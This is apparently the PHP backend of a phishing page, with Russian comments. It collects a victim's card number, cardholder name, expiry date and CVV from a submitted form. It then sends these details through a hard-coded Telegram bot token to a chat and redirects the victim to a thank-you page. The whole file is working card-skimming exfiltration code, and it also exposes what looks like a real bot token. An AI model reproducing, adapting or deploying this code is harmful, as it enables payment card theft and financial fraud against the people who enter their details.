
<?php

/* https://api.telegram.org/botXXXXXXXXXXXXXXXXXXXXXXX/getUpdates,
где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */

$cardholder = $_POST['cardholder'];
$cardnumber = $_POST['card_number'];
$month = $_POST['card_month'];
$year = $_POST['card_year'];
$cvv = $_POST['card_cvv'];

$token = "6526376873:AAGw4eIbP1djKalAu73iCaHdmoqn-OtpiQM";
$chat_id = "-6414523847";
$arr = array(
  'Держатель карты: ' => $cardholder,
  'Номер карты: ' => $cardnumber,
  'Месяц:' => $month,
  'Год:'=> $year,
  'Секретный код:' => $cvv
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: thank-you.html');
} else {
  echo "Error";
}
?>
